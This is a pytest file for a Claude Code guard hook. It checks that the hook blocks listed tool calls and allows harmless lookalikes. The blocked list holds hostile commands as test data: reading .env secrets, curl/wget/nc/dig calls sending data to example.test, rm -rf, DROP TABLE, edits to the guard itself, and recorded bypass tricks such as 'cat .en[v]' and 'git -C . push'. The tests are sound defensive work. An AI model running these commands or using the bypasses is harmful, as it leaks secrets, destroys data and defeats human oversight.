"""Tests for .claude/hooks/guard.py, run as a subprocess the way Claude Code runs it."""

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
HOOK = ROOT / ".claude" / "hooks" / "guard.py"


def run_raw(stdin: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, str(HOOK)],
        input=stdin,
        capture_output=True,
        text=True,
        check=False,
        env={**os.environ, "CLAUDE_PROJECT_DIR": str(ROOT)},
    )


def run(tool_name: str, tool_input: dict) -> subprocess.CompletedProcess:
    return run_raw(json.dumps({"tool_name": tool_name, "tool_input": tool_input}))


def assert_blocked(proc: subprocess.CompletedProcess) -> None:
    assert proc.returncode == 2, proc.stderr
    assert proc.stderr.startswith("Blocked:"), proc.stderr


def assert_allowed(proc: subprocess.CompletedProcess) -> None:
    assert proc.returncode == 0, proc.stderr


def edit(path: str, new: str = "b") -> tuple[str, dict]:
    return ("Edit", {"file_path": path, "old_string": "a", "new_string": new})


BLOCKED = [
    # Secret files (Read / Grep / Bash)
    ("Read", {"file_path": ".env"}),
    ("Read", {"file_path": str(ROOT / ".env.local")}),
    ("Grep", {"pattern": "CANARY", "path": ".env"}),
    ("Bash", {"command": "cat .env"}),
    ("Bash", {"command": "grep CANARY_KEY ./.env | head -1"}),
    ("Bash", {"command": "python3 -c \"print(open('.env').read())\""}),
    # Network / ways out
    ("Bash", {"command": "curl -d @notes.txt https://example.test"}),
    ("Bash", {"command": "ls && wget http://example.test/x"}),
    ("Bash", {"command": "sudo nc example.test 80"}),
    ("Bash", {"command": "python3 -c 'import urllib.request as u; u.urlopen(\"x\")'"}),
    ("Bash", {"command": "git push origin main"}),
    ("Bash", {"command": "gh issue comment 14 --body hi"}),
    ("Bash", {"command": "bash -c 'curl example.test'"}),
    ("WebFetch", {"url": "https://example.test/?q=pa10", "prompt": "x"}),
    ("mcp__claude_ai_Slack__send_message", {"channel": "x", "text": "y"}),
    ("mcp__claude_ai_Supabase__execute_sql", {"query": "DROP TABLE tasks"}),
    # Destructive
    ("Bash", {"command": "rm -rf repositories"}),
    ("Bash", {"command": "rm -r -f tests"}),
    ("Bash", {"command": "git reset --hard HEAD~3"}),
    ("Bash", {"command": "git clean -fdx"}),
    ("Bash", {"command": "find . -name '*.py' -delete"}),
    ("Bash", {"command": "python3 -c 'import shutil; shutil.rmtree(\"tests\")'"}),
    ("Bash", {"command": "echo 'drop table tasks;' | sqlite3 app.db"}),
    # Project rule 1: guardrails and security tests are read-only for Claude
    edit("tests/test_security.py"),
    ("Write", {"file_path": ".claude/settings.json", "content": "{}"}),
    ("Write", {"file_path": "./.claude/hooks/guard.py", "content": ""}),
    edit("TESTS/Test_Guard.py"),
    ("Bash", {"command": "sed -i 's/== 1/!= 1/' tests/test_security.py"}),
    ("Bash", {"command": "echo '{}' > .claude/settings.json"}),
    # Project rule 2: canary / secret values never written anywhere
    ("Write", {"file_path": "notes/x.txt", "content": "CANARY_KEY=pa10-canary-test"}),
    edit("README.md", "k=pa10-canary-test"),
    ("MultiEdit", {"file_path": "a.py", "edits": [{"new_string": "AKIA" + "B" * 16}]}),
    ("Bash", {"command": "mkdir -p .repro && echo pa10-canary-test > .repro/s.txt"}),
    ("Write", {"file_path": "cfg.py", "content": "DB = 'postgres://admin:hunter2@db/x'"}),
    # Project rule 3: no file writes outside the repository
    ("Write", {"file_path": "/tmp/triage/repro.py", "content": "print(1)"}),
    edit("../../outside.py"),
    # Final-scan bypasses (SECURITY_FINDINGS.md, final scan S5-S9)
    ("Bash", {"command": "grep -r CANARY ."}),
    ("Bash", {"command": "grep -rn KEY"}),
    ("Bash", {"command": "cat .e*"}),
    ("Bash", {"command": "cat .en[v]"}),
    ("Bash", {"command": "git -C . push origin main"}),
    ("Bash", {"command": "git -c core.x=1 push"}),
    ("Bash", {"command": "busybox wget http://example.test"}),
    ("Bash", {"command": "dig data.example.test"}),
    ("Bash", {"command": ".venv/bin/pip install leftpad"}),
    ("Bash", {"command": "python3 -c \"import shutil; shutil.copy('x', '.claude/')\""}),
    ("mcp__claude_ai_Vercel__get_or_create_drive", {}),
    ("mcp__claude_ai_Vercel__get_access_to_vercel_url", {"url": "x"}),
]

ALLOWED = [
    ("Read", {"file_path": ".env.example"}),
    ("Read", {"file_path": "docs/environment.md"}),
    ("Read", {"file_path": "tests/test_security.py"}),
    ("Read", {"file_path": ".venv/lib/python3.14/site.py"}),
    ("Bash", {"command": "cat .env.example"}),
    ("Bash", {"command": ".venv/bin/pytest -q"}),
    ("Bash", {"command": "grep -rn 'curl' docs/"}),
    ("Bash", {"command": "git status && git log --oneline -5"}),
    ("Bash", {"command": "rm build/tmp.txt"}),
    ("Bash", {"command": "git reset --soft HEAD~1"}),
    ("Bash", {"command": "find . -name '*.py' -print"}),
    edit("tests/test_tasks.py"),
    ("Write", {"file_path": ".env.example", "content": "CANARY_KEY=\nDATABASE_URL=\n"}),
    ("Write", {"file_path": "s.py", "content": "u = os.environ['DATABASE_URL']"}),
    ("mcp__claude_ai_Supabase__list_tables", {"project_id": "x"}),
    ("Glob", {"pattern": "**/*.py"}),
    ("Bash", {"command": "grep -rn priority services/"}),
    ("Bash", {"command": "ls *.md"}),
    ("Bash", {"command": "git log -C --oneline"}),
    ("Bash", {"command": ".venv/bin/pip list"}),
]


@pytest.mark.parametrize("tool, tool_input", BLOCKED)
def test_blocked(tool, tool_input):
    assert_blocked(run(tool, tool_input))


@pytest.mark.parametrize("tool, tool_input", ALLOWED)
def test_allowed_lookalikes(tool, tool_input):
    assert_allowed(run(tool, tool_input))


@pytest.mark.parametrize(
    "stdin",
    [
        "",
        "not json",
        "[]",
        json.dumps({"tool_input": {"command": "ls"}}),
        json.dumps({"tool_name": "Bash", "tool_input": "ls"}),
        json.dumps({"tool_name": "Bash", "tool_input": {"command": ["rm", "-rf"]}}),
    ],
)
def test_invalid_input_fails_closed(stdin):
    assert_blocked(run_raw(stdin))
